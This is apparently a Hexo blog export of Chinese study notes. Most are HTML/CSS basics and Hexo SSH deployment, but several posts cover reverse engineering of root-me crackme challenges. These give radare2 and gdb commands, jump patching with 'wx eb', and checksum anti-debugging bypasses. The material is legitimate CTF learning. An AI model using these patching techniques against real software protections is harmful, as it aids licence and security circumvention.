<h5 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h5><p>弹出消息框的地方，pased， alt+f9  , 再点消息框（80%的情况下有用）<br>在memory窗口下搜索，内存中的数据<br>find reference </p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>前端学习_html_css_1</title>
    <url>/2020/10/29/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0_html_css_1/</url>
    <content><![CDATA[<h2 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p><em>连接 80 端口需要管理员权限（非管理员用户只能监听大于 1024 的端口</em></p>
<p><em>流（stream）代表一个客户端和服务端之间打开的连接。</em></p>
<p>？闭包作为参数？</p>
<a id="more"></a>
<hr>
<h4 id=""><a href="#" class="headerlink" title=""></a><!DOCTYPE html></h4><p>— 文档类型。混沌初分，HTML 尚在襁褓（大约是 1991/92 年）之时，DOCTYPE 用来链接一些 HTML 编写守则，比如自动查错之类。DOCTYPE 在当今作用有限，仅用于保证文档正常读取。现在知道这些就足够了。</p>
<h4 id="html-1"><a href="#html-1" class="headerlink" title="html"></a>html</h4><p><code>&lt;html&gt;</code> 元素。<br>该元素包含整个页面的内容，也称作根元素。</p>
<h4 id="head"><a href="#head" class="headerlink" title="head"></a>head</h4><p><code>&lt;head&gt;</code>元素。该元素的内容对用户不可见，其中包含例如面向搜索引擎的搜索关键字（keywords）、页面描述、CSS 样式表和字符编码声明等。</p>
<p><code>&lt;meta charset=&quot;utf-8&quot;&gt; </code><br>该元素指定文档使用 UTF-8 字符编码 ，UTF-8 包括绝大多数人类已知语言的字符。基本上 UTF-8 可以处理任何文本内容，还可以避免以后出现某些问题，没有理由再选用其他编码。</p>
<p><code>&lt;title&gt; </code>元素。该元素设置页面的标题，显示在浏览器标签页上，也作为收藏网页的描述文字。</p>
<h4 id="body"><a href="#body" class="headerlink" title="body"></a>body</h4><p><code>&lt;body&gt; </code>元素。该元素包含期望让用户在访问页面时看到的内容，包括文本、图像、视频、游戏、可播放的音轨或其他内容。</p>
<h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><pre><code>&lt;img src=&quot;images/firefox-icon.png&quot; alt=&quot;测试图片&quot;&gt;</code></pre>
<p><code>alt</code>，是图像的描述内容 属性<br><code>src</code>也是属性，资源</p>
<h4 id="列表list"><a href="#列表list" class="headerlink" title="列表list"></a>列表list</h4><p>ul无序<br>ol有序<br>列表的每个项目用一个列表项目（List Item）元素 <code>&lt;li&gt;</code> 包围</p>
<pre><code>&lt;ul&gt;  无序列表
  &lt;li&gt;技术人员&lt;/li&gt;
  &lt;li&gt;思考者&lt;/li&gt;
  &lt;li&gt;建造者&lt;/li&gt;
&lt;/ul&gt;</code></pre>
<hr>
<p>####a<br>链接非常重要 — 它们赋予 Web 网络属性。要植入一个链接，我们需要使用一个简单的元素 — <code>&lt;a&gt;</code> — a 是 “anchor” （锚）的缩写</p>
<pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/about/manifesto/&quot;&gt;Mozilla 宣言&lt;/a&gt;</code></pre>
<p>href是属性</p>
<h4 id="测试本地文件"><a href="#测试本地文件" class="headerlink" title="测试本地文件"></a>测试本地文件</h4><p>它们具有服务端代码。 服务器端语言（如 PHP 或 Python）需要一个特殊的服务器来解释代码并提供结果。</p>
<p>层叠样式表（Cascading Style Sheet，简称：CSS）是为网页添加样式的代码<br>要选择一个 HTML 页面里所有的段落元素，然后将其中的文本改成红色，可以这样写 CSS<br>p {<br>  color: red;<br>}<br>再将该 CSS 文件连接至 HTML 文档，否则 CSS 代码不会对 HTML 文档在浏览器里的显示效果有任何影响</p>
<p>JavaScript（缩写：JS）是一门完备的 动态编程语言</p>
<p>对象：JavaScript 里一切皆对象，一切皆可储存在变量里。</p>
<p>例如disabled 属性，他们可以标记表单输入使之变为不可用(变灰色)，</p>
<p>实体引用： 在HTML中包含特殊字符</p>
<pre><code>&lt;    &amp;lt;
&gt;    &amp;gt;
&quot;    &amp;quot;
&#39;    &amp;apos;
&amp;    &amp;amp;</code></pre>
<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>HTML中的内容置为注释，你需要将其用特殊的记号<code>&lt;!--</code>和<code>--&gt;</code>包括起来</p>
<h4 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h4><p>许多<code>&lt;meta&gt; </code>元素包含了name 和 content 特性：</p>
<p>name 指定了meta 元素的类型； 说明该元素包含了什么类型的信息。<br>content 指定了实际的元数据内容。</p>
<hr>
<h4 id="span"><a href="#span" class="headerlink" title="span"></a>span</h4><p>在你的站点增加自定义图标<br>这是一个 <code>&lt;span&gt; </code>元素，它<code>没有语义</code>。当您想要对它用CSS（或者JS）时，您可以用它包裹内容，且不需要附加任何额外的意义</p>
<hr>
<h4 id="文字样式"><a href="#文字样式" class="headerlink" title="文字样式"></a>文字样式</h4><p>无序<code>&lt;ul&gt;</code><br>有序 Ordered<br><code>&lt;ol&gt;</code> 元素<br>将一个列表嵌入到另一个列表是完全可以的<br>用<code>&lt;em&gt;</code>（emphasis）元素来标记斜体<br><code>&lt;strong&gt; </code>加粗<br><code>&lt;i&gt; </code>被用来传达传统上用斜体表达的意义：外国文字，分类名称，技术术语，一种思想……<br><code>&lt;b&gt;</code> 被用来传达传统上用粗体表达的意义：关键字，产品名称，引导句……<br><code>&lt;u&gt;</code> 被用来传达传统上用下划线表达的意义：专有名词，拼写错误……<br>不要用</p>
<h4 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h4><pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;Mozilla 主页&lt;/a&gt;</code></pre>
<p>alt属性添加支持信息</p>
<pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;
  &lt;img src=&quot;mozilla-image.png&quot; alt=&quot;链接至 Mozilla 主页的 Mozilla 标志&quot;&gt;
&lt;/a&gt;</code></pre>
<p>可以有两个index.html文件，前提是他们在不同的目录下</p>
<p>指向上级目录： 如果你想在projects/index.html中包含一个指向pdfs/project-brief.pdf的超链接，你必须先返回上级目录，然后再回到pdf目录。“返回上一个目录级”使用两个英文点号表示 — <code>..</code> — 所以你应该使用的URL是<code> ../pdfs/project-brief.pdf</code></p>
<p>超链接除了可以链接到文档外，也可以链接到HTML文档的特定部分（被称为文档片段）。必须首先给要链接到的元素分配一个id属性</p>
<pre><code>&lt;a href=&quot;contacts.html#Mailing_address&quot;&gt;我们的地址&lt;/a&gt;
&lt;a href=&quot;#Mailing_address&quot;&gt;</code></pre>
<p>当链接到同一网站的其他位置时，你应该使用相对链接（当链接到另一个网站时，你需要使用绝对链接<br>使用绝对URL时，浏览器首先通过DNS（见万维网是如何工作的）查找服务器的真实位置</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://download.mozilla.org/?product=firefox-latest-ssl&amp;os=win64&amp;lang=zh-CN&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">download</span>=<span class="string">&quot;firefox-latest-64bit-installer.exe&quot;</span>&gt;</span>  默认保存文件名</span><br></pre></td></tr></table></figure>


<hr>
<h4 id="网站结构"><a href="#网站结构" class="headerlink" title="网站结构"></a>网站结构</h4><p>创建网站的一种常见方式——每一页都使用相同的页面结构，包括相同的导航菜单</p>
<pre><code>&lt;a href=&quot;mailto:nowhere@mozilla.org&quot;&gt;向 nowhere 发邮件&lt;/a&gt;</code></pre>
<p>使用上标和下标。 <code>&lt;sup&gt;</code> 和<code>&lt;sub&gt;</code>元素可</p>
<pre><code>&lt;p&gt;如果 x&lt;sup&gt;2&lt;/sup&gt; 的值为 9，那么 x 的值必为 3 或 -3。&lt;/p&gt;</code></pre>
<p>为了实现语义化标记，HTML 提供了明确这些区段的专用标签，例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>：页眉。</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span>：导航栏。</span><br><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span>：主内容。主内容中还可以有各种子内容区段，可用<span class="tag">&lt;<span class="name">article</span>&gt;</span>、<span class="tag">&lt;<span class="name">section</span>&gt;</span> 和 <span class="tag">&lt;<span class="name">div</span>&gt;</span> 等元素表示。</span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span>：侧边栏，经常嵌套在 <span class="tag">&lt;<span class="name">main</span>&gt;</span> 中。</span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span>：页脚。</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span> 是一个内联的（inline）无语义元素，使用 class 属性提供一些标签，使这些元素能易于查询</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> 是一个块级无语义元素，应仅用于找不到更好的块级元素时，或者不想增加特定的意义时</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span> 可在段落中进行换行</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span> 元素在文档中生成一条水平分割线</span><br></pre></td></tr></table></figure>


<p><code>&lt;iframe&gt;</code><br>元素旨在允许您将其他Web文档嵌入到当前文档中</p>
<h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>给 HTML 元素加个类名（class），在 CSS 中再选中那个类名</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;special&quot;</span>&gt;</span></span><br><span class="line">css中</span><br><span class="line">.special &#123;</span><br><span class="line">  color: orange;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h4><p>重要：：选择嵌套在<code>&lt;li&gt;</code> 元素内的<code>&lt;em&gt;</code>我们可以使用一个称为包含选择符的选择器，它只是单纯地在两个选择器之间加上一个空格</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">li</span> <span class="selector-tag">em</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: rebeccapurple;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置直接出现在标题后面并且与标题具有相同层级的段落样式，为此需在两个选择器之间添加一个 + 号 (成为 相邻选择符)</p>
<p>根据状态确定样式</p>
<pre><code>a:link
a:hover

article p span &#123; ... &#125;
h1 + ul + p &#123; ... &#125;</code></pre>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> <span class="selector-tag">h1</span> + <span class="selector-tag">p</span> <span class="selector-class">.special</span> &#123;</span><br><span class="line">在&lt;body&gt;之内，紧接在&lt;h1&gt;后面的&lt;p&gt;元素的内部，类名为special。</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="css属性"><a href="#css属性" class="headerlink" title="css属性"></a>css属性</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">font-size</span></span><br><span class="line"><span class="selector-tag">width</span></span><br><span class="line"><span class="selector-tag">background-color</span></span><br><span class="line"><span class="selector-tag">color</span></span><br><span class="line"><span class="selector-tag">border</span></span><br></pre></td></tr></table></figure>

<p><code>calc()</code>函数 进行简单计算<br><code>rotate()</code></p>
<hr>
<h4 id="额外样式表"><a href="#额外样式表" class="headerlink" title="额外样式表"></a>额外样式表</h4><p>将额外的样式表导入主CSS样式表，可以使用@import:<br><code>@import &#39;styles2.css&#39;;</code></p>
<h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><p>应用两条<code>同级别</code>的规则（相同规则）<br><code>理解为后面的规则覆盖前面的规则</code></p>
<p>有不同选择器对应相同的元素的时候需要使用哪个规则<br><code>一个元素选择器比类选择器的优先级更低会被其覆盖</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">千位： 如果声明在 <span class="selector-tag">style</span> 的属性（内联样式）则该位得一分。这样的声明没有选择器，所以它得分总是1000。</span><br><span class="line">百位： 选择器中包含<span class="selector-tag">ID</span>选择器则该位得一分。</span><br><span class="line">十位： 选择器中包含类选择器、属性选择器或者伪类则该位得一分。</span><br><span class="line">个位：选择器中包含元素、伪元素选择器则该位得一分。</span><br></pre></td></tr></table></figure>
<h4 id="class-id"><a href="#class-id" class="headerlink" title="class id"></a>class id</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;outer&quot; class=&quot;container&quot;&gt;</span><br><span class="line"><span class="selector-id">#outer</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>id 对应<code> #outer</code><br>class对应<code>.container</code></p>
<h4 id="盒子"><a href="#盒子" class="headerlink" title="盒子"></a>盒子</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">标题(&lt;<span class="selector-tag">h1</span>&gt;等)和段落(&lt;<span class="selector-tag">p</span>&gt;)默认情况下都是块级的盒子</span><br><span class="line">做链接的 &lt;<span class="selector-tag">a</span>&gt; 元素、 &lt;<span class="selector-tag">span</span>&gt;、 &lt;<span class="selector-tag">em</span>&gt; 以及 &lt;<span class="selector-tag">strong</span>&gt; 都是默认处于 <span class="selector-tag">inline</span> 状态的</span><br><span class="line">＜<span class="selector-tag">div</span>＞块级元素</span><br><span class="line">盒子<span class="selector-tag">display</span> 属性的设置，比如 <span class="selector-tag">inline</span> 或者 <span class="selector-tag">block</span> ，来控制盒子的外部显示类型</span><br><span class="line">在标准模型中，如果你给盒设置 <span class="selector-tag">width</span> 和 <span class="selector-tag">height</span>，实际设置的是 <span class="selector-tag">content</span> <span class="selector-tag">box</span></span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/BJ5qkq"><img src="https://s1.ax1x.com/2020/10/29/BJ5qkq.jpg" alt="BJ5qkq.jpg"></a><br>替代盒模型，width就是盒的宽度，而不是content的宽度</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line">*, *<span class="selector-pseudo">::before</span>, *<span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: inherit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有两个外边距相接的元素，这些外边距将合并为一个外边距，即最大的单个外边距的大小</p>
<hr>
<h4 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h4><p>元素使用 display: inline-block，实现我们需要的块级的部分效果：</p>
<p>设置width 和height 属性会生效。<br>padding, margin, 以及border 会推开其他元素。</p>
<hr>
<h4 id="背景图像"><a href="#背景图像" class="headerlink" title="背景图像"></a>背景图像</h4><p>默认情况下，大图不会缩小以适应方框，因此我们只能看到它的一个小角，而小图则是平铺以填充方框</p>
<p><code>background-repeat</code>属性用于控制图像的平铺行为</p>
<p><code>background-size</code>属性，它可以设置长度或百分比值，来调整图像的大小以适应背景</p>
<p>背景是指定他们如何滚动时，内容滚动。这是由<code>background-attachment</code>属性控制的</p>
<p><code>border-radius</code>属性和与方框的每个角相关的长边来实现方框的圆角</p>
<p><code>background-color:rgba(0,0,0,.5);</code><br>RGBA颜色　第四个值表示颜色的alpha通道，它控制<code>不透明度</code>。如果将这个值设置为0，它将使颜色完全透明<br>半透明的黑色背景颜色</p>
<h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">overflow</span>属性</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">hidden</span>　隐藏掉溢出</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">scroll</span>　你的浏览器总会显示滚动条</span><br><span class="line"><span class="selector-tag">overflow-x</span>　　　－ｙ</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">auto</span>　　</span><br></pre></td></tr></table></figure>

<h4 id="绝对长度单位"><a href="#绝对长度单位" class="headerlink" title="绝对长度单位"></a>绝对长度单位</h4><p><code>px    像素　＝1/96ｃｍ</code></p>
<h4 id="相对长度单位"><a href="#相对长度单位" class="headerlink" title="相对长度单位"></a>相对长度单位</h4><p><code>em</code>    在 font-size 中使用是相对于父元素的字体大小，在其他属性中使用是相对于自身的字体大小，如 width</p>
<p>总是想让它至少有个确定的高度，你应该给它设置一个min-height属性</p>
<h4 id="图片溢出"><a href="#图片溢出" class="headerlink" title="图片溢出"></a>图片溢出</h4><p>一张图片的max-width设为100%。<br><code>max－width:100%　　</code>指的是父容器宽度的百分数<br>技术是用来让图片可响应的，所以在更小的设备上浏览的时候，它们会合适地缩放，但会先加载大的图像，在缩放</p>
<p>主页cargo-generate</p>
]]></content>
      <tags>
        <tag>FRONT-END</tag>
      </tags>
  </entry>
  <entry>
    <title>在新电脑上重新部署hexo</title>
    <url>/2019/11/19/%E5%9C%A8%E6%96%B0%E7%94%B5%E8%84%91%E4%B8%8A%E9%87%8D%E6%96%B0%E9%83%A8%E7%BD%B2hexo/</url>
    <content><![CDATA[<p>近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了</p>
<h4 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h4><p><a href="https://hexo.io/docs/" title="hexo安装">hexo安装</a>遵循该页面进行<strong>git</strong>和<strong>nodejs</strong>的安装<br><code>将之前的hexo文件整个拷贝过来</code></p>
<a id="more"></a>
<h4 id="2-配置SSH"><a href="#2-配置SSH" class="headerlink" title="2. 配置SSH"></a>2. 配置SSH</h4><p>生成rsa公私钥</p>
<pre><code>$ cd ~/.ssh
# Checks to see if there is a directory named &quot;.ssh&quot; in your user directory

$ ssh-keygen -t rsa -C &quot;your_email@example.com&quot;
# Creates a new ssh key using the provided email
Generating public/private rsa key pair.
Enter file in which to save the key (/home/you/.ssh/id_rsa):</code></pre>
<p>然后在GitHub里添加公钥，在项目的setting里有一<code>deploy key</code>，在这里添加公钥<br>使用下列命令验证</p>
<pre><code>ssh -T git@github.com</code></pre>
<p>如果不行，就是没有在<code>.ssh</code>文件夹里创建，需要接下来的两步</p>
<pre><code>ssh-agent -s
ssh-add ~/.ssh/id_rsa</code></pre>
<p>若提示要输入密码什么的，则在<code>_config.yml</code>配置文件中修改<code>repo</code></p>
<pre><code>deploy:
  type: git
  repo: git@github.com:chengjianhua/chengjianhua.github.io.git
  branch: master</code></pre>
<p>这样就可以了，不用<code>npm install</code>或<code>initial</code></p>
]]></content>
      <tags>
        <tag>else</tag>
      </tags>
  </entry>
  <entry>
    <title>学习r2</title>
    <url>/2020/09/24/%E5%AD%A6%E4%B9%A0r2/</url>
    <content><![CDATA[<h2 id="逆向-学习r2"><a href="#逆向-学习r2" class="headerlink" title="逆向 学习r2"></a>逆向 学习r2</h2><h3 id="RABIN2-—-Binary-program-info-extractor"><a href="#RABIN2-—-Binary-program-info-extractor" class="headerlink" title="RABIN2 — Binary program info extractor"></a>RABIN2 — Binary program info extractor</h3><pre><code>$ rabin2 -I megabeets_0x1</code></pre>
<p><code>stripped false</code><br>没有剥离符号表<br><code>static   false</code> //所以是动态链接</p>
<a id="more"></a>
<h3 id="r2-radare2"><a href="#r2-radare2" class="headerlink" title="r2 //radare2"></a>r2 //radare2</h3><h4 id="ie"><a href="#ie" class="headerlink" title="ie"></a>ie</h4><pre><code>[0x08048370]&gt; ie</code></pre>
<p>ie 命令可以打印出程序的入口点</p>
<hr>
<h4 id=""><a href="#" class="headerlink" title="?"></a>?</h4><p>在任何一个命令后面添加 ? 来获得更多的子命令信息：<br>    [0x08048370]&gt; i?</p>
<hr>
<h4 id="aa"><a href="#aa" class="headerlink" title="aa"></a>aa</h4><p>使用 ‘aa’ 命令来分析文件</p>
<pre><code>[0x08048370]&gt; a?</code></pre>
<p>aa?<br>aaa[?]              autoname functions after aa (see afna)</p>
<hr>
<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag 是所有类似特征的集合，展示所有的 flag ，用 ‘fs’ 命令<br>    [0x08048370]&gt; fs</p>
<h4 id="f"><a href="#f" class="headerlink" title="f"></a>f</h4><p> f         list flags (will only list flags from selected flagspaces<br>    [0x08048370]&gt; fs imports; f</p>
<hr>
<h4 id="iz"><a href="#iz" class="headerlink" title="iz"></a>iz</h4><p>iz – 列出数据段里的字符串</p>
<hr>
<h4 id="axt"><a href="#axt" class="headerlink" title="axt"></a>axt</h4><pre><code>[0x08048370]&gt; axt @@ str.*</code></pre>
<p> axt [addr]      find data/code references to this address</p>
<p><code>@@                   # foreach iterator command:</code></p>
<hr>
<h4 id="x"><a href="#x" class="headerlink" title="x"></a>x</h4><p>| x @@ sym.*          run ‘x’ over all flags matching ‘sym.’ in current flagspace</p>
<hr>
<h4 id="s"><a href="#s" class="headerlink" title="s"></a>s</h4><p>s    # Help for the seek commands. See ?$? to see all variables</p>
<hr>
<h4 id="afl"><a href="#afl" class="headerlink" title="afl"></a>afl</h4><p>af?<br>用 ‘afl’ 指令，这个指令代表着分析函数列表（Analyze Functions List）.</p>
<hr>
<h4 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h4><p>s main<br>用 ‘pdf’（输出反汇编代码）</p>
<hr>
<h4 id="m"><a href="#m" class="headerlink" title="m"></a>m</h4><p>m<key> 可以用来标记特定的偏移地址，之后输入对应的key就可以跳转到你设置的地方.</p>
<hr>
<h4 id="V"><a href="#V" class="headerlink" title="V"></a>V</h4><p>V 视图模式<br>shell 里输入 VV来进入图形模式</p>
<hr>
<p>f sym.<tab> 来定位出 sym.beet 函数<br>pdf @ sym.beet 命令，‘@’ 表示临时查找<br>可视视图界面直接跳转到 beet 函数<br>上面说过的方框中的数字吗？这里直接按 3 就可以了<br> gd 命令，d 就是每一个跳转或者调用代码旁边的 字母</p>
<hr>
<h4 id="ahi"><a href="#ahi" class="headerlink" title="ahi"></a>ahi</h4><p>:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7<br>ahi s       set base to string (1)<br>ahi s 是用来设置字符串特定的偏移地址<br>@@是一个迭代器，可以用来接受后面输入的多个参数,执行完这条命令后</p>
<hr>
<h4 id="r"><a href="#r" class="headerlink" title="r"></a>r</h4><p>r 图形模式刷新</p>
<hr>
<h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><p>rahash2 包含很多种算法来求证一个文件或者字符串的校验值,具体的用法请使用 ‘man rahash2 ‘.</p>
<hr>
<h4 id="00"><a href="#00" class="headerlink" title="00"></a>00</h4><p>oo           reopen current file<br>ood [args]      # reopen in debug mode (with args)</p>
<hr>
<h4 id="dc"><a href="#dc" class="headerlink" title="dc"></a>dc</h4><p>dc   Execution continuation commands<br>| dc                           Continue execution of all children</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向_root_me_2</title>
    <url>/2020/10/07/%E9%80%86%E5%90%91_root_me_2/</url>
    <content><![CDATA[<h2 id="逆向-root-me"><a href="#逆向-root-me" class="headerlink" title="逆向 root_me"></a>逆向 root_me</h2><h3 id="PE-NET"><a href="#PE-NET" class="headerlink" title="PE .NET"></a>PE .NET</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection">https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection</a></p>
<a id="more"></a>
<h3 id="MIPS-ELF-MIPS-Basic-Crackme"><a href="#MIPS-ELF-MIPS-Basic-Crackme" class="headerlink" title="MIPS. ELF MIPS - Basic Crackme"></a>MIPS. ELF MIPS - Basic Crackme</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme">https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme</a></p>
<p>在MIPS架构中，“ $ ra”寄存器保存返回地址，类似于x86指令指针“ EIP”</p>
<h3 id="ELF-fake-instrucations"><a href="#ELF-fake-instrucations" class="headerlink" title="ELF  fake instrucations"></a>ELF  fake instrucations</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints</a></p>
<pre><code>dis main  
gdb-peda$ set disassembly-flavor intel //汇编用intel语言显示
gdb-peda$ i r $edx //显示edx值
ni //ni/si都是汇编级别的断点定位。si会进入汇编和C函数内部,ni不会
//这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码</code></pre>
<p><code>jz</code> 表示当<code>zf =1 </code>时跳转，即结果为0跳转。<br><code>jnz</code> 即 <code>zf=0 </code>时跳转，即结果不为0 跳转。</p>
<pre><code>gdb-peda$ i r //全显示
gdb-peda$ set $eax=0

gdb-peda$ x/s $eax //查看寄存器指向的内容

call WPA(&quot;toto&quot;, &quot;toto&quot;) //直接在gdb中运行命令？？</code></pre>
<h3 id="ELF-ptrace"><a href="#ELF-ptrace" class="headerlink" title="ELF ptrace"></a>ELF ptrace</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace</a></p>
<p><em>Load the application into <code>IDA pro</code>,search main function,press <code>F5 </code>to disassemble it,get the code below:</em><br><code>IDA 按F5 反编译 生成伪代码</code></p>
<hr>
<p><code>r2 -ww ./ch3.bin</code></p>
<pre><code> -w           open file in write mode
 ww foobar            write wide string &#39;f\x00o\x00o\x00b\x00a\x00r\x00&#39;

 wx 9090     write two intel nops</code></pre>
<p><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code><br>Short Jump（短跳转）机器码 EB</p>
<p><code>pd N             disassemble N instructions</code></p>
<pre><code>gdb-peda$ i b
 set $al=$dl </code></pre>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向_root_me_3</title>
    <url>/2020/10/08/%E9%80%86%E5%90%91_root_me_3/</url>
    <content><![CDATA[<h2 id="ELF-x86-No-software-breakpoints"><a href="#ELF-x86-No-software-breakpoints" class="headerlink" title="ELF x86 - No software breakpoints"></a>ELF x86 - No software breakpoints</h2><h3 id="看反汇编，大致了解过程"><a href="#看反汇编，大致了解过程" class="headerlink" title="看反汇编，大致了解过程"></a>看反汇编，大致了解过程</h3><p>这是众所周知的<code>反调试</code>技术，它不能在应用程序本身中<code>放置任何软件断点</code>。因为当我们在<code>用户模式</code>应用程序中遇到<code>断点</code>时，代码中将放入<code>0xCC（int3）</code>，因此计算将是错误的，并将生成错误的<code>校验和</code>.</p>
<a id="more"></a>
<p>这是在ecx中计算一种散列值，它基于入口点的整个代码。如果我们对函数进行任何更改，值将不再相同，从而阻止我们编辑二进制文件.</p>
<p>计算整个<code>text 指令的和</code>，所以放入<code>0xCC</code>会 报错，也就是改变的指令。</p>
<hr>
<h3 id="移位运算符"><a href="#移位运算符" class="headerlink" title="移位运算符"></a>移位运算符</h3><p>a&lt;&lt;3<br><code>a的内容不改变</code></p>
<p><code>edx &amp; 0xff</code><br>取最后8位</p>
<hr>
<h3 id="g"><a href="#g" class="headerlink" title="g++"></a>g++</h3><pre><code>g++主要用来编译c++文件，g++编译c++文件是会连接libc++。
gcc主要用来编译c文件，也可编译c++，但gcc编译c++文件默认不连接libc++。</code></pre>
<hr>
<h3 id="移位"><a href="#移位" class="headerlink" title="移位"></a>移位</h3><p>移位时，移出的位数全部丢弃，移出的空位补入的数与左移还是右移有关。如果是<code>左移</code>，则规定补入的数全部是<code>0</code>；如果是<code>右移</code>，还与被移位的数据是否带<code>符号</code>有关。若是<code>不带符号数</code>，则补入的数全部为<code>0</code>；若是<code>带符号数</code>，则补入的数全部等于原数的最左端位上的原数(即<code>原符号位</code>)</p>
<hr>
<h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>引入了命名空间这个概念，它可作为<code>附加信息来区分</code>不同库中相同名称的函数、类、变量等。使用了命名空间即定义了上下文。本质上，命名空间就是定义了<code>一个范围</code>。</p>
<p>可以使用 <code>using namespace</code> 指令，这样在使用命名空间时就可以<code>不用在前面加上</code>命名空间的名称。这个指令会告诉编译器，后续的代码将使用指定的命名空间中的名称。</p>
<hr>
<h2 id="ELF-x86-CrackPass"><a href="#ELF-x86-CrackPass" class="headerlink" title="ELF x86 - CrackPass"></a>ELF x86 - CrackPass</h2><p><code>gdb-peda$ help x</code><br>Examine memory: x/FMT ADDRESS.</p>
<hr>
<p><code>gdb-peda$ print/t $ebx</code><br>二进制打印寄存器</p>
<hr>
<pre><code>set $ZF = 6
set $eflags |= (1 &lt;&lt; $ZF)</code></pre>
<p>设定ZF值为1</p>
<hr>
<p><code>show</code></p>
<hr>
<p><code>where</code><br>显示当前位置</p>
<hr>
<p><code>MOVZX</code> 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数 扩展到 16 位或 32 位。</p>
<hr>
